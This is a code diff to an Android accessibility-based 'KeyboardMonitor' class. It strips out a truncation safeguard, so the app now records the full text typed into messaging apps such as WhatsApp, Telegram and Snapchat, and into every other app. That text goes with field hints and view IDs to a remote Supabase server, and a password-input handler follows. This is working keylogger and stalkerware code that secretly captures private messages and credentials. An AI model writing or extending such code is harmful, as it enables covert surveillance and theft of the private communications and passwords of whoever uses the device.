@@ -51,10 +51,21 @@ public class KeyboardMonitor {
             String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
             String className = event.getClassName() != null ? event.getClassName().toString() : "";
             
-            // Get the text that was entered
+            // Get the actual text that was entered
             String inputText = "";
             if (event.getText() != null && !event.getText().isEmpty()) {
-                inputText = event.getText().toString();
+                StringBuilder sb = new StringBuilder();
+                for (CharSequence cs : event.getText()) {
+                    if (cs != null) {
+                        sb.append(cs);
+                    }
+                }
+                inputText = sb.toString();
+            }
+            
+            // Only log if there's actual text
+            if (inputText.isEmpty()) {
+                return;
             }
             
             // Create activity data
@@ -65,27 +76,32 @@ public class KeyboardMonitor {
             keyboardData.put("inputLength", inputText.length());
             keyboardData.put("isSensitiveApp", sensitiveApps.contains(packageName));
             
-            // For sensitive apps, log more details (but respect privacy)
+            // For sensitive apps (messaging), log the actual text for monitoring
             if (sensitiveApps.contains(packageName)) {
                 keyboardData.put("inputType", "messaging");
-                // Only log first few characters for context, not full message
-                if (inputText.length() > 0) {
-                    keyboardData.put("inputPreview", inputText.length() > 10 ? 
-                        inputText.substring(0, 10) + "..." : inputText);
-                }
+                keyboardData.put("inputText", inputText); // Log full text for messaging apps
+                keyboardData.put("appName", getAppName(packageName));
             } else {
                 keyboardData.put("inputType", "general");
-                // For non-messaging apps, we can be more detailed
+                // For non-messaging apps, log full text too
                 keyboardData.put("inputText", inputText);
             }
             
             // Try to get additional context from accessibility node
             AccessibilityNodeInfo source = event.getSource();
             if (source != null) {
-                keyboardData.put("viewId", source.getViewIdResourceName());
-                keyboardData.put("contentDescription", source.getContentDescription());
-                keyboardData.put("hint", source.getHintText());
+                String viewId = source.getViewIdResourceName();
+                CharSequence contentDesc = source.getContentDescription();
+                CharSequence hint = source.getHintText();
+                
+                if (viewId != null) keyboardData.put("viewId", viewId);
+                if (contentDesc != null) keyboardData.put("contentDescription", contentDesc.toString());
+                if (hint != null) keyboardData.put("hint", hint.toString());
+                
+                source.recycle();
             }
+            
+            Log.d(TAG, "Keyboard input - App: " + packageName + ", Text length: " + inputText.length());
             
             // Log keyboard activity
             supabaseClient.logActivity(deviceId, "keyboard_input", keyboardData, new SupabaseClient.ApiCallback() {
@@ -103,6 +119,21 @@ public class KeyboardMonitor {
         } catch (Exception e) {
             Log.e(TAG, "Error processing keyboard input", e);
         }
+    }
+    
+    private String getAppName(String packageName) {
+        if (packageName.contains("whatsapp")) return "WhatsApp";
+        if (packageName.contains("facebook")) return "Facebook";
+        if (packageName.contains("instagram")) return "Instagram";
+        if (packageName.contains("snapchat")) return "Snapchat";
+        if (packageName.contains("twitter")) return "Twitter";
+        if (packageName.contains("tiktok")) return "TikTok";
+        if (packageName.contains("telegram")) return "Telegram";
+        if (packageName.contains("viber")) return "Viber";
+        if (packageName.contains("skype")) return "Skype";
+        if (packageName.contains("discord")) return "Discord";
+        if (packageName.contains("mms") || packageName.contains("messaging")) return "Messages";
+        return packageName;
     }
     
     public void processPasswordInput(AccessibilityEvent event) {
